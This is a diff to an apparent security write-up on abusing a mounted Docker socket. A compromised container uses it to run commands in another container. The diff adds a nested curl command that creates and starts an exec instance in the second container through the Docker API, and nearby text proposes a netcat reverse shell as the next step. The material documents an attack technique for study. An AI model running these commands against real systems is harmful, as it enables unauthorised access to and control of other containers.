@@ -82,6 +82,9 @@ So, Container C1 is compromised.
 	
 	`curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/exec/<ExecID>/start -H "Content-Type: application/json" -d '{ "Detach": false, "Tty": false }'`
 
+**You can also use a single nested command instead of running two commands**
+
+	curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/exec/$(curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/dcd2cca67d187fcbbd7fef316eda4b8d9b21fa06a5f63bba55b82371a8ab408b/exec -H "Content-Type: application/json" -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "DetachKeys": "ctrl-p,ctrl-q", "Tty": false, "Cmd": ["date"] }' | jq  '.[]' | tr -d '"')/start -H "Content-Type: application/json" -d '{ "Detach": false, "Tty": false }'
 	
 Now we know that we have the ability to run command on another container (C2), we can get the complete shell access of C2 by getting reverse shell, We would need netcat installed on C2 that can send us the reverse shell. We would need netcat on container C1 as well to catch the reverse shell.
 
